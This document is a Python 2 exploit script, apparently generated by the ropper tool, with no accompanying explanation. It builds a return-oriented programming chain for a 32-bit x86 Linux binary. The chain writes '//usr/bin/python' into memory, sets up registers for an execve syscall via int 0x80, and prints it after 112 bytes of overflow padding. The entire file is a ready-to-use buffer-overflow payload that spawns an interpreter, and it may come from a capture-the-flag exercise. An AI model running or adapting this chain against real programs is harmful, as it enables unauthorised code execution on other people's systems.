#!/usr/bin/env python
# Generated by ropper ropchain generator #
from struct import pack

p = lambda x : pack('I', x)

IMAGE_BASE_0 = 0x08048000 # 6fa86a6bab81ec52ab7828a626e0a2c6445fe6435515a5ad0f3d7f3214743613
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = ''

rop += rebase_0(0x0002685b) # 0x0806e85b: pop edx; ret; 
rop += '//us'
rop += rebase_0(0x00082b38) # 0x080cab38: pop eax; push cs; or al, 0x41; ret; 
rop += rebase_0(0x00091060)
rop += rebase_0(0x00033cca) # 0x0807bcca: mov dword ptr [eax], edx; pop ebx; pop esi; pop edi; ret; 
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += rebase_0(0x0002685b) # 0x0806e85b: pop edx; ret; 
rop += 'r/bi'
rop += rebase_0(0x00082b38) # 0x080cab38: pop eax; push cs; or al, 0x41; ret; 
rop += rebase_0(0x00091064)
rop += rebase_0(0x00033cca) # 0x0807bcca: mov dword ptr [eax], edx; pop ebx; pop esi; pop edi; ret; 
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += rebase_0(0x0002685b) # 0x0806e85b: pop edx; ret; 
rop += 'n/py'
rop += rebase_0(0x00082b38) # 0x080cab38: pop eax; push cs; or al, 0x41; ret; 
rop += rebase_0(0x00091068)
rop += rebase_0(0x00033cca) # 0x0807bcca: mov dword ptr [eax], edx; pop ebx; pop esi; pop edi; ret; 
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += rebase_0(0x0002685b) # 0x0806e85b: pop edx; ret; 
rop += 'thon'
rop += rebase_0(0x00082b38) # 0x080cab38: pop eax; push cs; or al, 0x41; ret; 
rop += rebase_0(0x0009106c)
rop += rebase_0(0x00033cca) # 0x0807bcca: mov dword ptr [eax], edx; pop ebx; pop esi; pop edi; ret; 
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += rebase_0(0x0000ded0) # 0x08055ed0: xor eax, eax; ret; 
rop += rebase_0(0x0002685b) # 0x0806e85b: pop edx; ret; 
rop += rebase_0(0x00091070)
rop += rebase_0(0x0000e915) # 0x08056915: mov dword ptr [edx], eax; ret; 
rop += rebase_0(0x00026882) # 0x0806e882: pop ecx; pop ebx; ret; 
rop += rebase_0(0x00091070)
rop += p(0xdeadbeef)
rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; 
rop += rebase_0(0x00091060)
rop += rebase_0(0x0002685b) # 0x0806e85b: pop edx; ret; 
rop += rebase_0(0x00091070)
rop += rebase_0(0x0000ded0) # 0x08055ed0: xor eax, eax; ret; 
rop += rebase_0(0x00033cea) # 0x0807bcea: inc eax; ret; 
rop += rebase_0(0x00033cea) # 0x0807bcea: inc eax; ret; 
rop += rebase_0(0x00033cea) # 0x0807bcea: inc eax; ret; 
rop += rebase_0(0x00033cea) # 0x0807bcea: inc eax; ret; 
rop += rebase_0(0x00033cea) # 0x0807bcea: inc eax; ret; 
rop += rebase_0(0x00033cea) # 0x0807bcea: inc eax; ret; 
rop += rebase_0(0x00033cea) # 0x0807bcea: inc eax; ret; 
rop += rebase_0(0x00033cea) # 0x0807bcea: inc eax; ret; 
rop += rebase_0(0x00033cea) # 0x0807bcea: inc eax; ret; 
rop += rebase_0(0x00033cea) # 0x0807bcea: inc eax; ret; 
rop += rebase_0(0x00033cea) # 0x0807bcea: inc eax; ret; 
rop += rebase_0(0x00027190) # 0x0806f190: int 0x80; ret; 
print b'\x41' * 112 + rop
